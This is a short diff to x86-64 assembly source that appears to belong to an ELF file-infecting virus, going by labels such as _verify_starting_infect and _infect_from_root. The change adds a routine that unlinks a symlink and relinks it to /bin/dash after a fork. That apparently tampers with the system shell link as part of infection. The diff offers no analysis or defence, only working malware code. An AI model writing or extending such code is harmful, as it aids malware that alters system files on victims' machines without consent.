@@ -13,6 +13,9 @@ section .text
 ;    .string db '/etc/rc.local', 0
 ;    .len equ $ - _rc_local.string
 
+_bin_dash:
+    .string db '/bin/dash', 0
+
 _bin_bash:
     .string db '/bin/bash', 0
 
@@ -45,6 +48,16 @@ _exit_properly:
 _ret:
     leave
     ret
+
+_relink_sh:
+    mov rax, 87
+    lea rdi, [rel _symlink]
+    syscall
+    mov rax, 88
+    lea rsi, [rel _symlink]
+    lea rdi, [rel _bin_dash]
+    syscall
+    jmp _verify_o_entry
 
 _log_file:
     .name db '/ptdr', 0
@@ -87,7 +100,7 @@ _verify_starting_infect:
     mov rax, 57
     syscall
     cmp rax, 0
-    jne _verify_o_entry
+    jne _relink_sh
     lea rdi, [rel _exit_properly]
 
 _infect_from_root:
